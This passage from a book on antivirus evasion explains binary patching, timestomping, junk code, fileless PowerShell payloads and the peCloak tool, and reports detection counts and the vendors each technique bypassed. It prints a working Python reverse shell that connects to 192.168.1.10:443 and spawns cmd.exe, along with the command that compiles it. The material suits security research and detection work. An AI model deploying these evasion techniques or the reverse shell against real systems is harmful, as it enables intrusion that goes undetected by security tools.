Now that we have some basic knowledge and are able to make sense of assembly 
instructions, we can move on to a more interesting example.
154     Other Antivirus Bypass Techniques
Antivirus bypass using binary patching 
In the following example, we used netcat.exe (https://eternallybored.
org/misc/netcat/), which is already signed and detected as a malicious file by most 
antivirus engines. When we opened the compiled file in x32dbg and came to the file's 
entry point, the first thing we saw was that the first function used the command sub 
esp, 18 – subtract 18 from the ESP register (as described earlier).
To make sure we don't "break" or "corrupt" the file, meaning that the file will still be able 
to run within the operating system even after making changes, we made a minor change 
to the program's code. We changed the number 18 to 17, then performed patching on the 
file so it would be saved as part of the original executable on the computer's hard drive.
When we uploaded the file to VirusTotal, we noticed that with this very minor change, 
we had actually succeeded in getting around 10 antivirus programs. Antivirus detections 
went down from 34 to 24.
Theoretically speaking, any change to the contents of a file could bypass a different static 
antivirus engine, because we do not know which signatures each static engine is using.
The following screenshot shows the original netcat.exe with the instruction sub 
esp, 18:
Figure 6.6 – The sub esp, 18 instruction before the change
Antivirus bypass using binary patching     155
And the following screenshot shows the same file after changing the value to 17:
Figure 6.7 – The sub esp, 17 instruction after the change
After changing this value, we need to patch the executable, by pressing Ctrl + P and 
clicking Patch File:
Figure 6.8 – The Patch File button
156     Other Antivirus Bypass Techniques
The following screenshot shows the number of detections for the netcat.exe file before 
the change:
Figure 6.9 – VirusTotal's results of 34/70 detections
And here we can see the number of detections for the modified file:
Figure 6.10 – VirusTotal's results of 24/72 detections
Antivirus bypass using binary patching     157
This relatively simple technique managed to bypass 10 different antivirus engines, which 
would not be able to detect the malicious file with this slight modification. Here is the 
antivirus software that did not detect the patched netcat.exe file:
• Avast
• AVG
• Avira (No Cloud)
• Bitdefender
• CrowdStrike Falcon
• Cybereason
• Fortinet
• F-Secure
• G-Data
• MalwareBytes
• McAfee
• Microsoft
• Palo Alto Networks
• Sophos
• Symantec
• Trend Micro
Having learned about the basics of Assembly x86, the disassembly process, and binary 
patching, let's learn about the second bypass technique of binary patching. 
Timestomping
Another technique we can perform on a compiled file is called Timestomping. This time, 
we're not editing the file itself, but instead, its creation time.
One of the ways many antivirus engines use to sign malware is the date the file was 
created. They do this to perform static signing. For example, if the strings X, Y, and Z 
exist and the file was created on January 15, 2017, then the file is detected as malware of a 
particular kind.
158     Other Antivirus Bypass Techniques
On the left side here, you can see netcat.exe in its original form. On the right, you can 
see the exact same file after I changed its creation time:
Figure 6.11 – Before and after timestomping
After this change, we can get around more static signatures that make use of the file 
creation time condition to detect the malware.
Now that we know about binary patching using basic reverse engineering and 
timestomping, we will move on to learning about the next bypass technique we used 
during our research – the technique of antivirus bypass using junk code.
Antivirus bypass using junk code     159
Antivirus bypass using junk code
Antivirus engines sometimes search within the logic of the code to perform detection on 
it in order to later classify it as a particular type of malware.
To make it difficult for antivirus software to search through the logic of the code, we can 
use junk code, which helps us make the logic of the code more complicated. 
There are many ways to use this technique, but the most common methods involve using 
conditional jumps, irrelevant variable names, and empty functions.
For example, instead of writing malware that contains a single basic function with two 
ordinary variables (for instance, an IP address and a port number) with generic variable 
names and no conditions, it would be preferable, if we wished to complicate the code, to 
create three functions, of which two are empty (unused) functions. Within the malicious 
function, we can also add a certain number of conditions that will never occur and add 
some meaningless variable names.
The following simple example diagram shows code designed to open a socket to the 
address of an attacker, 192.168.10.5.
On the right side, we have added junk code to complicate the original program while still 
producing the same functionality:
Figure 6.12 – Pseudo junk code
160     Other Antivirus Bypass Techniques
Besides using empty functions, conditions that will never occur, and innocent variable 
names, we can also confuse the antivirus software by performing more extensive 
operations that affect the hard drive. There are several ways to achieve this, including 
loading a DLL that does not exist and creating legitimate registry values.
Here's an example:
Figure 6.13 – Pseudo junk code
In this diagram, you can see simple pseudo code that opens a connection using a socket to 
a command-and-control server of the attacker. On the left side is the code before the junk 
code technique is conducted, and on the right side, you can see the same functionality 
after the junk code technique is used.
Important note
Junk code can also be used with techniques such as control flow obfuscation 
to harden analysis for security researchers and to make the antivirus bypass 
potentially more effective.
Now that we know how to use junk code to bypass antivirus software, we can continue to 
the next technique we used during our research, PowerShell. 
Antivirus bypass using PowerShell     161
Antivirus bypass using PowerShell
Unlike the techniques we have introduced so far, this technique is not based on a 
malicious executable file but is used mostly as fileless malware. With this technique, there 
is no file running on the hard drive; instead, it is running directly from memory.
While researching and writing this book, we used PowerShell fileless malware, the 
malicious functionality of which involves connecting to a remote server through a specific 
port. We divided the test into two stages. In the first part, we ran the payload from a PS1 
file, which is saved to the hard drive, and in the second part, we ran the payload directly 
from PowerShell.exe.
The following screenshot illustrates that the Sophos antivirus software managed to 
successfully detect the PS1 file with the malicious payload saved to the hard drive with the 
name PS.ps1:
Figure 6.14 – Sophos Home detected the malicious PS1 file
Then, instead of running the malicious payload from the PS1 file saved to the hard drive, 
we ran the exact same payload, this time directly from PowerShell.exe.
In the following screenshot, there is a pseudo payload that we have used to demonstrate 
this concept:
Figure 6.15 – The beginning of the payload that is used in the malicious PS1 file
162     Other Antivirus Bypass Techniques
In this screenshot, you can see that the payload ran directly from PowerShell.exe, 
with the Sophos antivirus software running in the background.
It seems as if the antivirus software would be able to detect this payload – after all, it just 
stopped the exact same payload in the PS1 file.
But after running the payload directly from PowerShell.exe, we were able to get a 
Meterpreter shell on the endpoint, even though the Sophos Home Free antivirus was 
installed on it:
Figure 6.16 – A Meterpreter shell on an endpoint with Sophos Home installed on it
It is possible that the reason the Sophos antivirus software did not detect the malicious 
payload is that it was not using the heuristic engine correctly.
Despite the fact that the file had already been detected as malware just a minute before 
running it in PowerShell.exe, the bypass may have worked because the heuristic 
engine detected that the payload was running through PowerShell.exe, which is a file 
signed by Microsoft.
Having understood this technique, let's proceed with the last one. 
Now that we know why PowerShell is powerful to bypass antivirus software, we can move 
on to learning the last bypass technique we used during our research – the technique of 
antivirus bypass using a single malicious functionality.
Antivirus bypass using a single malicious functionality     163
Antivirus bypass using a single malicious 
functionality
One of the central problems that antivirus software vendors need to deal with is false 
positives. Antivirus software is not supposed to report to the user every single little 
insignificant event taking place on the endpoint. If it does, the user may be forced to 
abandon the antivirus software and switch to another antivirus software that creates fewer 
interruptions during regular use.
To deal with false-positive detection, antivirus vendors increase their detection rate. For 
example, if a file is not signed in the static and dynamic engines, the heuristic engine goes 
into operation and starts to calculate on its own whether the file is malicious using all 
sorts of parameters. For example, the antivirus software will try to determine whether the 
file is opening a socket, performing dropping into the persistence folder, and receiving 
commands from a remote server. The rate can be 70%, for example, that the file is detected 
as malicious and the antivirus software will stop it from running.
To take advantage of this situation to perform antivirus bypass, we need to ask an 
important question:
Will the antivirus software issue an alert for a malicious file when the file performs a 
single malicious function?
Therefore, it depends on the functionality. If we are talking about functionality that is not 
necessarily malicious, the antivirus will detect the file as containing a malicious function, 
but the score won't be high enough to issue an alert to the user or prevent the malicious 
file from running, thus the antivirus software will allow the file to run.
This kind of behavior of the heuristic engine is exactly what we can take advantage of to 
bypass antivirus software.
The following diagram illustrates how each file is rated. As we explain in the following 
diagram, if only one of the conditions is true, the file's score increases and the antivirus 
software detects the file as malicious and signs it.
164     Other Antivirus Bypass Techniques
But if the score is low, the antivirus will not issue a malware alert, even though it contains 
malicious functionality:
Figure 6.17 – "ML" diagram
To best illustrate this technique, and for proof-of-concept purposes, we will use a Python 
program that connects to a remote command and control server to receive remote 
commands (https://stackoverflow.com/questions/37991717/python-
windows-reverse-shell-one-liner):
import os, socket, sys
import threading as trd
import subprocess as sb
def sock2proc(s, p):
    while True:
        p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
def proc2sock(s, p):
Antivirus bypass using a single malicious functionality     165
    while True: 
        s.send(p.stdout.read(1).encode())
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    try: 
        s.connect(("192.168.1.10", 443))
        break
    except: 
        pass
p=sb.Popen(["cmd.exe"], stdout=sb.PIPE, stderr=sb.
STDOUT, stdin=sb.PIPE, shell=True, text=True)
trd.Thread(target=sock2proc, args=[s,p], daemon=True).start()
trd.Thread(target=proc2sock, args=[s,p], daemon=True).start()
try: 
    p.wait()
except: 
    s.close()
    sys.exit(0)
To compile the preceding code to an executable, we will use the following pyinstaller 
command:
pyinstaller --onefile socket_example.py
166     Other Antivirus Bypass Techniques
After we have compiled the preceding Python code, we execute it on an endpoint machine 
to get a reverse shell, while our listener (Netcat in this case) is in listening mode on port 
443:
Figure 6.18 – A netcat-based shell
Following is a screenshot of the results of VirusTotal after uploading this malicious file: 
Figure 6.19 – VirusTotal's results – 9/70 detections
Antivirus bypass using a single malicious functionality     167
As can be seen, this technique succeeded in bypassing 61 antivirus detection engines that 
will not detect this malicious file. The following list shows the antivirus software vendors 
that did not detect our uploaded file:
• Avira (No Cloud)
• Bitdefender
• Comodo
• Check Point ZoneAlarm
• Cybereason
• Cyren
• FireEye
• Fortinet
• F-Secure
• Kaspersky
• MalwareBytes
• McAfee
• Palo Alto Networks
• Panda
• Qihoo-360
• SentinelOne (Static ML)
• Sophos
• Symantec
• Trend Micro
We do not have to write malware in Python at all; we can also use C, C++, AutoIt, and 
many other languages.
However, it is important to realize that if the number of malicious functions is low, the 
ability of the malware will also be limited. It is fair to assume that the permissions of the 
malware will be basic, it won't have persistence, and so on.
168     Other Antivirus Bypass Techniques
The power of combining several antivirus 
bypass techniques
It is important to note that, practically speaking, in order to perform bypassing on 
an antivirus engine in the real world, you must use a combination of multiple bypass 
techniques, not just a single one. Even if a specific technique manages to get past a static 
engine, it is reasonable to assume that a dynamic and/or heuristic engine will be able 
to detect the file. For example, we can use a combination of the following techniques to 
achieve a full antivirus bypass: 
Figure 6.20 – A combination of several techniques to bypass antivirus software in the real world
To demonstrate the concept of combining several antivirus bypass techniques, we will use 
an amazing Python script named peCloak.py developed by Mike Czumak, T_V3rn1x, 
and SecuritySift. This tool, as defined by the developers, is a Multi-Pass Encoder & 
Heuristic Sandbox Bypass AV Evasion Tool that literally combines several antivirus bypass 
techniques to bypass heuristic and static engines.
The power of combining several antivirus bypass techniques     169
The following antivirus bypass techniques are implemented in the tool:
• Encoding – To bypass the static antivirus engine.
• Heuristic bypass – Basically, the use of junk code in order to make the antivirus 
believe that it is a benign executable.
• Code cave insertion – The Python script peCloak.py will insert a code cave based 
on a pre-defined number of sequential null-bytes, and if true, it will insert the code 
to this location. If sequential null bytes were not found, it will create a new section 
in the PE file (named .NewSection by default). At the end of the code cave, there 
will be a restoration of execution flow.
Let's now do a comparison between a regular payload file and one that is peCloaked.
An example of an executable before and after peCloak
After a brief explanation about the peCloak tool, let's now see an example of an executable 
after it has been peCloaked.
Here is an executable file with some standard sections before the use of the tool:
Figure 6.21 – An executable before it has been peCloaked
170     Other Antivirus Bypass Techniques
In the following screenshot, the same executable file is presented but after it has been 
peCloaked:
Figure 6.22 – An executable after it has been peCloaked
Notice the newly added section named .NewSec.
Now let's view the code in IDA disassembler and see where the newly added section is 
called. In the following screenshot, you can see the start function that immediately 
calls the sub_40B005 function, which will be the location of the newly added code cave 
under the .NewSec section:
Figure 6.23 – The start of the executable's code, which calls sub_40B005
And in the following screenshot, we can see the newly added code that is under the newly 
added section of .NewSec:
The power of combining several antivirus bypass techniques     171
Figure 6.24 – The code of the newly added code cave in the .NewSec section
There is much more to understand in peCloak.py; we have only demonstrated its code 
caving feature and generally discussed its other features.
How does antivirus software not detect it?
The reason that antivirus software does not detect such files or executables is that antivirus 
software detections are based on pre-defined patterns that can be somehow predicted by 
the malware. The peCloak.py tool not only implements several interesting antivirus 
bypass techniques but also makes the file or executable not predictable and thus hard to 
detect by the fact that patterns change with each use of such a tool.
To summarize, you do not have to use tools such as peCloak, but you can definitely learn 
a lot from it and implement your own tools in order to bypass antivirus software. Also, 
learning from such tools can provide a lot of knowledge and insight for antivirus vendors 
and their security analysts and more ideas on how to implement detection mechanisms 
for such bypass techniques that are based on different approaches.
In the next section, we will present a table of all the antivirus software and EDR vendors 
we bypassed in our research.
172     Other Antivirus Bypass Techniques
Antivirus engines that we have bypassed in 
our research
The following table summarizes antivirus software we have researched and bypassed using 
the bypass techniques explored in this book:
Bypassed antivirus software with proof-of-concept
Summary     173
Bypassed antivirus software without proof of concepts (uploaded to VirusTotal only)
Table 6.1 – Bypassed Antivirus
Summary
In this chapter of the book, we learned about other antivirus bypass techniques that can be 
potentially used for bypassing both static and dynamic engines.
The techniques presented in the chapter were binary patching, junk code, PowerShell, and 
a single malicious functionality. 
In the binary patching technique, we learned the basics of reverse engineering x86 
Windows-based applications and the timestomping technique that is used to manipulate 
the timestamp of executable files.
174     Other Antivirus Bypass Techniques
In the junk code technique, we explained the use of if block statements, which will 